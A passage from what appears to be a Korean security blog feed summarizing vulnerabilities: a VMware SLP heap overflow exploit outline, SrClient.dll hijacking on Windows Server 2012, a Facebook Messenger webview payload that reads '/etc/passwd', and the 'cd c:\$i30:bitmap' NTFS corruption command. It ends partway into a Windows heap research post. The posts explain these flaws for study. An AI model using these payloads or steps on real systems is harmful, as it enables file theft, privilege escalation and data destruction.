Incoming socket stuff */</span>    SLPBuffer           sendbuf;<span class="hljs-comment">// ...</span>}SLPDSocket;</code></pre><p>VMware&#xC758; SLP &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; Remote Code execution&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><code>connection-&gt;state</code>&#xB97C; <code>STREAM_WRITE_FIRST</code>&#xB85C; &#xB36E;&#xC5B4;&#xC501;&#xB2C8;&#xB2E4;. &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; leak &#xD558;&#xAE30; &#xC704;&#xD574; <code>sendbuf-&gt;curpos</code>&#xB97C; <code>sendbuf-&gt;start</code>&#xB85C; &#xB9AC;&#xC14B;&#xC2DC;&#xCF1C;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</li><li><code>sendbuf-&gt;start</code>&#xC758; &#xC77C;&#xBD80;&#xBD84;&#xC744; 2&#xAC1C;&#xC758; &#xB110; &#xBC14;&#xC774;&#xD2B8;&#xB85C; &#xB36E;&#xC5B4;&#xC501;&#xB2C8;&#xB2E4;. &#xC5F0;&#xACB0; &#xD6C4; &#xC218;&#xC2E0;&#xC744; &#xAE30;&#xB2E4;&#xB9AC;&#xBA74;, <code>sendbuf</code>&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; leak &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><code>mmap()</code>&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xB41C; <code>recvbuf</code>&#xB97C; leak &#xD558;&#xAE30; &#xC704;&#xD574; &#xC0C8;&#xB85C;&#xC6B4; &#xC5F0;&#xACB0;&#xC744; &#xD558;&#xACE0; <code>sendbuf-&gt;curpos</code>&#xB97C; &#xB36E;&#xC5B4;&#xC501;&#xB2C8;&#xB2E4;. mmap &#xB41C; &#xC8FC;&#xC18C;&#xB97C; &#xD1B5;&#xD574; libc base &#xC8FC;&#xC18C;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><code>free_hook</code>&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC124;&#xC815;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0C8;&#xB85C;&#xC6B4; &#xC5F0;&#xACB0;&#xC5D0;&#xC11C; <code>recvbuf-&gt;curpos</code>&#xB97C; &#xB36E;&#xC5B4;&#xC501;&#xB2C8;&#xB2E4;. &#xC5F0;&#xACB0; &#xD6C4; &#xC804;&#xC1A1;&#xC774; &#xC2DC;&#xC791;&#xB418;&#xBA74; <code>free_hook</code>&#xC744; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC811;&#xC18D;&#xC744; &#xC885;&#xB8CC;&#xD558;&#xBA74; <code>free_hook</code>&#xC774; &#xD638;&#xCD9C;&#xB418;&#xC5B4; ROP &#xCCB4;&#xC778;&#xC774; &#xC2DC;&#xC791;&#xB429;&#xB2C8;&#xB2E4;.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>heap overflow</tag>
      
      <tag>idioth</tag>
      
      <tag>vmware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] SrClient DLL hijacking</title>
    <link href="/2021/03/03/fabu1ous/2021-03-03/"/>
    <url>/2021/03/03/fabu1ous/2021-03-03/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://blog.vonahi.io/srclient-dll-hijacking/">SrClient DLL Hijacking</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows Server 2012</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Windows Server 2012 R2&#xB97C; &#xC81C;&#xC678;&#xD55C; &#xBAA8;&#xB4E0; Windows Server 2012&#xC5D0;&#xC11C; &#xC545;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; DLL hijacking&#xC744; &#xD1B5;&#xD55C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Windows Module Installer Service&#xC758; <code>TiWork.exe</code>&#xAC00; Windows search order&#xC5D0; &#xC758;&#xAC70;&#xD558;&#xC5EC; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xB9AC;&#xC18C;&#xC2A4;(<code>SrClient.dll</code>)&#xC758; &#xB85C;&#xB4DC;&#xB97C; &#xC2DC;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;. <code>TiWork.exe</code>&#xB294; NT AUTHORITY\SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>SrClient.dll</code>&#xC744; hijacking &#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xB85C;&#xB4DC;&#xD558;&#xACE0;&#xC790; &#xD558;&#xB294; DLL&#xC758; &#xC808;&#xB300; &#xC8FC;&#xC18C; &#xD639;&#xC740; &#xC815;&#xD655;&#xD55C; &#xC8FC;&#xC18C;&#xB97C; &#xC9C0;&#xC815;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; Windows&#xB294; DLL search order&#xC5D0; &#xB530;&#xB77C; &#xD574;&#xB2F9; DLL &#xC704;&#xCE58;&#xB97C; &#xAC80;&#xC0C9;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>&#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC9C0;&#xC815;&#xD55C; &#xC8FC;&#xC18C;</li><li>System &#xB514;&#xB809;&#xD130;&#xB9AC; (<code>system32</code>, <code>systemWOW64</code>)</li><li>Windows &#xB514;&#xB809;&#xD130;&#xB9AC; (<code>C:\Windows\</code>)</li><li>&#xD604;&#xC7AC; &#xB514;&#xB809;&#xD130;&#xB9AC;</li><li><code>%PATH%</code>&#xD658;&#xACBD; &#xBCC0;&#xC218;&#xC5D0; &#xB4F1;&#xB85D;&#xB41C; &#xB514;&#xB809;&#xD130;&#xB9AC;</li></ol><p>Third-party App&#xC5D0; &#xC758;&#xD574; &#xBD80;&#xC801;&#xC808;&#xD55C; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC774; &#xC124;&#xC815;&#xB41C; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xAC00; <code>%PATH%</code> &#xD658;&#xACBD; &#xBCC0;&#xC218; &#xAC12;&#xC73C;&#xB85C; &#xB4F1;&#xB85D;&#xB418;&#xC5B4; &#xC788;&#xB2E4;&#xBA74; <code>SrClient.dll</code>&#xB97C; hijacking &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Windows&#xC758; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xCCB4;&#xD06C;&#xB97C; &#xD1B5;&#xD574;  <code>TiWork.exe</code>&#xC758; &#xC2E4;&#xD589;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC720;&#xC800; &#xAD8C;&#xD55C;&#xC5D0;&#xC11C; System &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC0C1;&#xC2B9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>eop</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>dll hijacking</tag>
      
      <tag>windows server</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Facebook Messenger 데스크톱 앱의 임의 파일 읽기 취약점</title>
    <link href="/2021/03/02/l0ch/2021-03-02/"/>
    <url>/2021/03/02/l0ch/2021-03-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d">Facebook Messenger Desktop App Arbitrary File Read</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Facebook Messenger for Desktop</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xD398;&#xC774;&#xC2A4;&#xBD81; &#xBA54;&#xC2E0;&#xC800;&#xC758; &#xB370;&#xC2A4;&#xD06C;&#xD1B1; &#xBC84;&#xC804; &#xC571;&#xC5D0;&#xC11C; arbitrary file read &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD398;&#xC774;&#xC2A4;&#xBD81; &#xBA54;&#xC2E0;&#xC800;&#xB294; Electron&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA70; <code>webviewTag</code> &#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>webview</code> &#xD0DC;&#xADF8;&#xB294; &#xB85C;&#xCEEC; &#xD30C;&#xC77C;&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC774; &#xC874;&#xC7AC;&#xD574; &#xD574;&#xCEE4;&#xAC00; <code>&lt;webview src=&quot;file:[file location]&quot;&gt;&lt;/webview&gt;</code> &#xB0B4;&#xC6A9;&#xC774; &#xD3EC;&#xD568;&#xB41C; &#xB9C1;&#xD06C;&#xB97C; &#xC804;&#xC1A1;&#xD558;&#xBA74; &#xD0C0;&#xAE43;&#xC758; &#xC784;&#xC758;&#xC758; &#xB85C;&#xCEEC; &#xD30C;&#xC77C;&#xC744; &#xC77D;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574; <code>/etc/passwd</code> &#xD30C;&#xC77C;&#xC744; &#xC77D;&#xB294; &#xACFC;&#xC815;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xD574;&#xCEE4;&#xAC00; &#xC784;&#xC758;&#xC758; &#xD0C0;&#xAE43;&#xC5D0;&#xAC8C; <code>webview</code> &#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xC545;&#xC131; &#xB9C1;&#xD06C;&#xB97C; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;.</li><li>&#xD0C0;&#xAE43;&#xC740; &#xC2A4;&#xD338; &#xC139;&#xC158;&#xC744; &#xC5F4;&#xACE0; &#xB9C1;&#xD06C;&#xB97C; &#xD074;&#xB9AD;&#xD569;&#xB2C8;&#xB2E4;.</li><li>Facebook Messenger&#xB294; &#xC545;&#xC131; &#xB9C1;&#xD06C;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; <code>&lt;webview&gt; src=&quot;file:///etc/passwd&quot;&gt;&lt;/webview&gt;</code> &#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; <code>/etc/passwd</code> &#xD30C;&#xC77C;&#xC744; &#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>webview.executeJavaScript()</code>&#xB85C; &#xB85C;&#xB4DC;&#xD55C; &#xD30C;&#xC77C;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC5B4;&#xC635;&#xB2C8;&#xB2E4;.</li></ol><p>Facebook&#xC740; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810; &#xBCF4;&#xACE0;&#xC11C;&#xC5D0; 2000$&#xC758; &#xBCF4;&#xC0C1;&#xC744; &#xC9C0;&#xAE09;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>facebook</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary file read</tag>
      
      <tag>electron</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Microsoft fixes Windows 10 drive corruption bug</title>
    <link href="/2021/03/01/idioth/2021-03-01/"/>
    <url>/2021/03/01/idioth/2021-03-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.bleepingcomputer.com/news/microsoft/microsoft-fixes-windows-10-drive-corruption-bug-what-you-need-to-know/">Microsoft fixes Windows 10 drive corruption bug &#x2014; what you need to know</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows XP</li><li>Windows 10</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><blockquote><p>&#xC544;&#xC9C1; &#xBA54;&#xC778; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xC5D0; &#xD328;&#xCE58;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xBC84;&#xADF8;&#xC785;&#xB2C8;&#xB2E4;.</p></blockquote><p>Microsoft&#xC5D0;&#xC11C; &#xD2B9;&#xC815; &#xACBD;&#xB85C;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAC70;&#xB098; &#xC870;&#xC791;&#xB41C; &#xD30C;&#xC77C;&#xC744; &#xBCF4;&#xB294; &#xAC83;&#xB9CC;&#xC73C;&#xB85C; NTFS &#xBCFC;&#xB968;&#xC774; &#xC190;&#xC0C1;&#xB420; &#xC218; &#xC788;&#xB294; Windows 10 &#xBC84;&#xADF8;&#xB97C; &#xC218;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xBC84;&#xADF8;&#xB294; &#xB0AE;&#xC740; &#xAD8C;&#xD55C;&#xC5D0;&#xC11C;&#xB3C4; &#xD55C; &#xC904;&#xC758; &#xBA85;&#xB839;&#xC5B4;(<code>cd c:\\$i30:bitmap</code>)&#xB9CC;&#xC73C;&#xB85C; &#xD2B8;&#xB9AC;&#xAC70; &#xB429;&#xB2C8;&#xB2E4;. &#xBA85;&#xB839; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#x201C;&#xD30C;&#xC77C; &#xB610;&#xB294; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xAC00; &#xC190;&#xC0C1;&#xB418;&#xC5B4; &#xC77D;&#xC744; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.&#x201D; &#xC624;&#xB958; &#xBA54;&#xC2DC;&#xC9C0;&#xAC00; &#xCD9C;&#xB825;&#xB41C; &#xD6C4; PC&#xB97C; &#xC7AC;&#xC2DC;&#xC791;&#xD558;&#xC5EC; &#xC190;&#xC0C1;&#xB41C; &#xB514;&#xC2A4;&#xD06C; &#xBCFC;&#xB968;&#xC744; &#xBCF5;&#xAD6C;&#xD558;&#xB77C;&#xB294; &#xC54C;&#xB78C;&#xC774; &#xD45C;&#xC2DC;&#xB429;&#xB2C8;&#xB2E4;.</p><p><code>$i30</code> NTFS &#xC778;&#xB371;&#xC2A4; &#xC5D4;&#xD2B8;&#xB9AC;&#xB85C; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xD30C;&#xC77C; &#xBC0F; &#xD558;&#xC704; &#xD3F4;&#xB354; &#xBAA9;&#xB85D;&#xC744; &#xD3EC;&#xD568;&#xD558;&#xB294; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC640; &#xAD00;&#xB828;&#xB41C; NTFS &#xC18D;&#xC131;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xC18D;&#xC131;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xB54C; &#xB4DC;&#xB77C;&#xC774;&#xBE0C;&#xAC00; &#xC190;&#xC0C1;&#xB418;&#xB294; &#xC774;&#xC720;&#xB294; &#xBE14;&#xB8E8;&#xC2A4;&#xD06C;&#xB9B0;&#xC5D0; &#xB300;&#xD55C; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD0A4;&#xAC00; &#xC791;&#xB3D9;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xC815;&#xD655;&#xD558;&#xAC8C; &#xC54C; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC785;&#xB825;&#xD558;&#xB294; &#xAC83;&#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xBC14;&#xB85C;&#xAC00;&#xAE30; &#xACBD;&#xB85C;&#xAC00; <code>C:\\$i30:bitmap</code>&#xC778; &#xD30C;&#xC77C;&#xC744; &#xBCF4;&#xB294; &#xAC83;&#xB9CC;&#xC73C;&#xB85C;&#xB3C4; &#xD574;&#xB2F9; &#xBC84;&#xADF8;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC5EC; NTFS &#xBCFC;&#xB968;&#xC774; &#xC190;&#xC0C1;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; ZIP &#xD30C;&#xC77C; &#xB0B4;&#xBD80;&#xC5D0; <code>C:\\$i30:bitmap</code> &#xBC14;&#xB85C;&#xAC00;&#xAE30;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC555;&#xCD95; &#xD30C;&#xC77C;&#xC744; &#xD1B5;&#xD574; &#xBC84;&#xADF8;&#xB97C; &#xC545;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Microsoft&#xB294; Windows Insider &#xBE4C;&#xB4DC; 21322 &#xB9B4;&#xB9AC;&#xC2A4;&#xC640; &#xD568;&#xAED8; &#xD574;&#xB2F9; &#xACBD;&#xB85C;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB824;&#xACE0; &#xD558;&#xBA74; &#x201C;&#xC9C0;&#xC815;&#xB41C; &#xACBD;&#xB85C;&#xB97C; &#xCC3E;&#xC744; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.&#x201D;&#xB97C; &#xCD9C;&#xB825;&#xD558;&#xAC8C; &#xC218;&#xC815;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.bleepingcomputer.com/news/security/windows-10-bug-corrupts-your-hard-drive-on-seeing-this-files-icon/">https://www.bleepingcomputer.com/news/security/windows-10-bug-corrupts-your-hard-drive-on-seeing-this-files-icon/</a></p><p><a href="https://www.sans.org/blog/ntfs-i30-index-attributes-evidence-of-deleted-and-overwritten-files/">https://www.sans.org/blog/ntfs-i30-index-attributes-evidence-of-deleted-and-overwritten-files/</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>ntfs</tag>
      
      <tag>idioth</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 2 - NT Heap</title>
    <link href="/2021/02/28/l0ch/pwncoolsexy-part2/"/>
    <url>/2021/02/28/l0ch/pwncoolsexy-part2/</url>
    
    <content type="html"><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! L0ch&#xC785;&#xB2C8;&#xB2E4;. &#xC624;&#xB298;&#xC740; &#xC774;&#xC804; &#xAE00;&#xC5D0;&#xC11C; &#xC608;&#xACE0;&#xD55C; &#xB300;&#xB85C; NT heap&#xC758; Low Fragmentation Heap&#xC5D0; &#xB300;&#xD574; &#xC4F0;&#xB824;&#xACE0; &#xD588;&#xC9C0;&#xB9CC;..  Windows Heap&#xC5D0; &#xB300;&#xD55C; &#xC804;&#xBC18;&#xC801;&#xC778; &#xC815;&#xB9AC;&#xC640; &#xAC19;&#xC774; &#xC4F0;&#xB294; &#xAC83;&#xC774; &#xC88B;&#xC744; &#xAC83; &#xAC19;&#xC544; Windows Heap&#xC73C;&#xB85C; &#xC8FC;&#xC81C;&#xB97C; &#xD655;&#xC7A5;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C;! &#xC624;&#xB298;&#xC740; WIndows&#xAC00; Heap&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xAD00;&#xB9AC;&#xD558;&#xB294;&#xC9C0; &#xD558;&#xB098;&#xC529; &#xB72F;&#xC5B4;&#xBCF4;&#xBA74;&#xC11C; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD560;&#xAC8C;&#xC694;!</p><h1 id="Windows-Heap"><a href="#Windows-Heap" class="headerlink" title="Windows Heap"></a>Windows Heap</h1><p>&#xC708;&#xB3C4;&#xC6B0;&#xC758; Heap &#xD560;&#xB2F9; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC740; NT Heap&#xACFC; Windows 10&#xC5D0;&#xC11C; &#xCD94;&#xAC00;&#xB41C; Segment Heap &#xB450; &#xAC00;&#xC9C0;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. NT Heap&#xC740; Windows&#xC758; &#xAE30;&#xBCF8; memory allocator&#xC774;&#xBA70; Segment Heap&#xC740; &#xCD5C;&#xADFC;&#xC5D0; &#xB3C4;&#xC785;&#xB41C; &#xB9CC;&#xD07C; &#xB354; &#xD6A8;&#xC728;&#xC801;&#xC778; memory allocator&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xB2F4;&#xC73C;&#xB85C; Segment Heap&#xC740; &#xB3C4;&#xC785; &#xCD08;&#xAE30;&#xC5D0;&#xB294; &#xC77C;&#xBD80; &#xC2DC;&#xC2A4;&#xD15C; &#xD504;&#xB85C;&#xC138;&#xC2A4;, MS &#xC5E3;&#xC9C0; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;, UWP(Universal Windows Platform) &#xC571; &#xB4F1;&#xC5D0;&#xC11C;&#xB9CC; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xC5C8;&#xC73C;&#xB098; 2020&#xB144; 5&#xC6D4; &#xC5C5;&#xB370;&#xC774;&#xD2B8; (&#xBC84;&#xC804; 2004, &#xBE4C;&#xB4DC; 19041)&#xB85C; &#xC77C;&#xBC18;&#xC801;&#xC778; Win32 &#xC5B4;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xB3C4; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xC5C8;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.. &#xB9CC; &#xC544;&#xC9C1;&#xC740; &#xC77C;&#xBC18;&#xC801;&#xC778; &#xC5B4;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0;&#xC11C;&#xB294; NT Heap&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xCD94;&#xC138;&#xC8E0;. &#xBA54;&#xBAA8;&#xB9AC; &#xC7A1;&#xC544;&#xBA39;&#xB294; &#xD558;&#xB9C8; &#xD06C;&#xB86C;&#xB3C4; Segment Heap&#xC744; &#xC801;&#xC6A9;&#xD55C; &#xD328;&#xCE58; &#xC774;&#xD6C4; &#xBA54;&#xBAA8;&#xB9AC; &#xC0AC;&#xC6A9;&#xB7C9;&#xC740; &#xC904;&#xC600;&#xC9C0;&#xB9CC; &#xC131;&#xB2A5; &#xC800;&#xD558;&#xB3C4; &#xAC19;&#xC774; &#xB098;&#xD0C0;&#xB098;&#xC11C; &#xB2E4;&#xC2DC; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xD588;&#xB2E4;&#xACE0; &#xD558;&#xB124;&#xC694;..&#x314B;&#x314B;</p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%201.png" alt></p><p>Segment Heap&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB294; &#xB2E4;&#xC74C;&#xC5D0; &#xB2E4;&#xB904;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACE0;, &#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC11C;&#xB294; NT Heap&#xC5D0; &#xB300;&#xD574; &#xC815;&#xB9AC;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. </p><h1 id="NT-Heap"><a href="#NT-Heap" class="headerlink" title="NT Heap"></a>NT Heap</h1><p>NT Heap&#xC5D0; &#xB300;&#xD55C; Overview&#xBD80;&#xD130; &#xC9DA;&#xACE0; &#xB118;&#xC5B4;&#xAC00; &#xBCFC;&#xAE4C;&#xC694;?</p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%202.png" alt></p><p>&#xC704; &#xC0AC;&#xC9C4;&#xC740; &#xC77C;&#xBC18;&#xC801;&#xC778; <code>malloc()</code>&#xACFC; <code>free()</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD574; Heap&#xC744; &#xD560;&#xB2F9;&#xD560; &#xB54C;&#xC758; &#xB0B4;&#xBD80; &#xD560;&#xB2F9; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC785;&#xB2C8;&#xB2E4;. </p><p>NT Heap&#xC740; &#xD06C;&#xAC8C; Front-End&#xC640; Back-End&#xB85C; &#xB098;&#xB220;&#xC9C0;&#xBA70; Front-End&#xAC00; &#xC774;&#xD6C4;&#xC5D0; &#xC124;&#xBA85;&#xD560; Low Fragmentation Heap(LFH)&#xC744; &#xC758;&#xBBF8;&#xD569;&#xB2C8;&#xB2E4;. LFH&#xAC00; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xB2E4;&#xBA74; Heap &#xBA54;&#xBAA8;&#xB9AC; &#xD560;&#xB2F9; &#xC2DC; Front-End&#xB97C; &#xAC74;&#xB108;&#xB6F0;&#xACE0; &#xBC14;&#xB85C; Back-End&#xB85C; &#xB118;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;.</p><h1 id="Low-Fragmentation-Heap"><a href="#Low-Fragmentation-Heap" class="headerlink" title="Low Fragmentation Heap"></a>Low Fragmentation Heap</h1><p>Heap Fragmentation(&#xB2E8;&#xD3B8;&#xD654;)&#xC740; &#xBC18;&#xBCF5;&#xB418;&#xB294; &#xD560;&#xB2F9;&#xACFC; &#xD574;&#xC81C; &#xC774;&#xD6C4; &#xAC00;&#xC6A9; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xC791;&#xACE0; &#xBD88;&#xC5F0;&#xC18D;&#xC801;&#xC73C;&#xB85C; &#xB098;&#xB25C; &#xC0C1;&#xD0DC;&#xB97C; &#xB9D0;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xB2E8;&#xD3B8;&#xD654;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xBA74; &#xAC00;&#xC6A9; &#xBA54;&#xBAA8;&#xB9AC;&#xBCF4;&#xB2E4; &#xC791;&#xC740; &#xD06C;&#xAE30;&#xC5D0; &#xB300;&#xD574; &#xD560;&#xB2F9;&#xC744; &#xC694;&#xCCAD;&#xD574;&#xB3C4; &#xC5F0;&#xC18D;&#xC801;&#xC778; &#xBA54;&#xBAA8;&#xB9AC; &#xAD6C;&#xAC04; &#xD655;&#xBCF4;&#xAC00; &#xB418;&#xC9C0; &#xC54A;&#xC544; &#xBA54;&#xBAA8;&#xB9AC; &#xD560;&#xB2F9; &#xC694;&#xCCAD;&#xC774; &#xC2E4;&#xD328;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%203.png" alt></p><blockquote><p>&#xB2E8;&#xD3B8;&#xD654;&#xB85C; &#xC778;&#xD574; &#xAC00;&#xC6A9; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xCDA9;&#xBD84;&#xD55C;&#xB370;&#xB3C4; &#xD560;&#xB2F9;&#xC774; &#xC2E4;&#xD328;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p></blockquote><p>&#xCD08;&#xAE30; &#xC708;&#xB3C4;&#xC6B0;&#xC5D0;&#xC11C;&#xB3C4; &#xC774;&#xB7F0; &#xB2E8;&#xD3B8;&#xD654; &#xC774;&#xC288;&#xAC00; &#xC874;&#xC7AC;&#xD588;&#xC73C;&#xBA70; MS&#xB294; &#xC774;&#xB7F0; 